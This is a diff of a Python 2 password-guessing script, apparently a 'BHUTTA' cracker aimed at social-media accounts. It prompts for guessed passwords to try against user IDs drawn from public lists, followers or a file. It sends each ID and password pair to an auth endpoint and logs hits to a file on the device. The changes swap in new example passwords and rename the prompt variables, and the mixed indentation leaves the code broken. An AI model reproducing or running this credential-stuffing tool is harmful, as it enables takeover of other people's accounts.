@@ -406,11 +406,11 @@ def a_s():
         print ''
         print '\033[1;31;1m~~~~ Auto pass public cracking ~~~~'
         print ''
-        print '\033[1;93m For example: 123 , 1234 , 12345, 786 , 12 , 1122'
+        print '\033[1;93m For example: 234567 , 223344 , 334455, 445566 , 556677 , 667788'
         print ''
-        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+        pass1 = raw_input('\033[1;92m[1]Password: ')
+        pass2 = raw_input('\033[1;92m[2]Password: ')
+        pass3 = raw_input('\033[1;92m[3]Password: ')
         pass4 = raw_input('\033[1;92m[4]Password: ')
         pass5 = raw_input('\033[1;92m[5]Password: ')
 	pass6 = raw_input('\033[1;92m[6]Password: ')
@@ -449,11 +449,11 @@ def a_s():
         print ''
         print '\033[1;31;1m~~~~ Auto pass followers cracking ~~~~'
         print ''
-        print ' \033[1;93mFor example: 123 , 1234 , 12345, 786 , 12 , 1122'
+        print '\033[1;93m For example: 234567 , 223344 , 334455, 445566 , 556677 , 667788'
         print ''
-        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+        pass1 = raw_input('\033[1;92m[1]Password: ')
+        pass2 = raw_input('\033[1;92m[2]Password: ')
+        pass3 = raw_input('\033[1;92m[3]Password: ')
         pass4 = raw_input('\033[1;92m[4]Password: ')
         pass5 = raw_input('\033[1;92m[5]Password: ')
 	pass6 = raw_input('\033[1;92m[6]Password: ')
@@ -491,11 +491,11 @@ def a_s():
         print ''
         print '\033[1;31;1m~~~~ Auto pass File cracking ~~~~'
         print ''
-        print '\033[1;93m For example: 123 , 1234 , 12345, 786 , 12 , 1122'
+        print '\033[1;93m For example: 234567 , 223344 , 334455, 445566 , 556677 , 667788'
         print ''
-        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+        pass1 = raw_input('\033[1;92m[1]Password: ')
+        pass2 = raw_input('\033[1;92m[2]Password: ')
+        pass3 = raw_input('\033[1;92m[3]Password: ')
         pass4 = raw_input('\033[1;92m[4]Password: ')
         pass5 = raw_input('\033[1;92m[5]Password: ')
 	pass6 = raw_input('\033[1;92m[6]Password: ')
@@ -534,6 +534,7 @@ def a_s():
         
         try:
 		data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
+		q = json.loads(data)
                         if 'loc' in q:
                             print '\033[1;92m[BHUTTA-OK] ' + uid + ' | ' + pass1
                             ok = open('/sdcard/ids/HOP_OK.txt', 'a')
